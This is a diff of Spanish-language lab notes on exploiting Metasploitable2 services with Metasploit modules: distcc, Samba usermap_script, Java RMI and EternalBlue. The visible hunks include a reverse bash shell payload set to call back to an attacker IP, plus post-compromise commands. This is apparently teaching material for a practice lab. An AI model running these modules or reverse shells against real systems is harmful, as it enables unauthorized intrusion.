@@ -21,7 +21,7 @@ Como extra, una vez comprometida la máquina, puedes buscar información como el
 | **Puertos**               | 3632/TCP                                                                                                                                                                                                                                                               |
 | **Módulos Metasploit**    | `exploit/unix/misc/distcc_exec` [^2]                                                                                                                                                                                                                                   |
 
-### Guía de explotación
+### Explotación
 
 ```bash
 # 1. Escanear puerto distccd
@@ -38,8 +38,7 @@ use exploit/unix/misc/distcc_exec
 set RHOSTS <IP_VICTIMA>
 set RPORT 3632
 
-# 5. Elegir payload (cmd/unix/reverse_bash — shell reversa en bash porque es
-#    el intérprete más universal en sistemas Linux y no requiere dependencias)
+# 5. Elegir payload o usar el predeterminado
 show payloads
 set payload cmd/unix/reverse_bash
 set LHOST <IP_ATACANTE>
@@ -54,8 +53,9 @@ hostname
 uname -a
 ifconfig
 ```
+![](attachments/{911F40C7-C6B8-4E5E-A5F7-35055A1FD85A}%201.png)
+![](attachments/{4C5D7EA3-8D70-45DD-81D3-A2BEE15DD36D}.png)
 
----
 
 ## Ejercicio 2 — Samba Usermap Script
 
@@ -71,7 +71,7 @@ ifconfig
 | **Puertos** | 139/TCP (netbios-ssn), 445/TCP (microsoft-ds) |
 | **Módulos Metasploit** | `exploit/multi/samba/usermap_script` [^4] |
 
-### Guía de explotación
+### Explotación
 
 ```bash
 # 1. Escanear puertos Samba
@@ -121,7 +121,7 @@ id
 | **Puertos** | 1099/TCP (RMI Registry) |
 | **Módulos Metasploit** | `exploit/multi/misc/java_rmi_server` [^6] |
 
-### Guía de explotación
+### Explotación
 
 ```bash
 # 1. Escanear puerto RMI
@@ -207,7 +207,7 @@ services
 | **Puertos** | 139/TCP, 445/TCP |
 | **Módulos Metasploit** | `exploit/windows/smb/ms17_010_eternalblue` [^8], `auxiliary/scanner/smb/smb_ms17_010` |
 
-### Guía de explotación
+### Explotación
 
 ```bash
 # NOTA: Metasploitable2 es Linux y NO es vulnerable a EternalBlue.
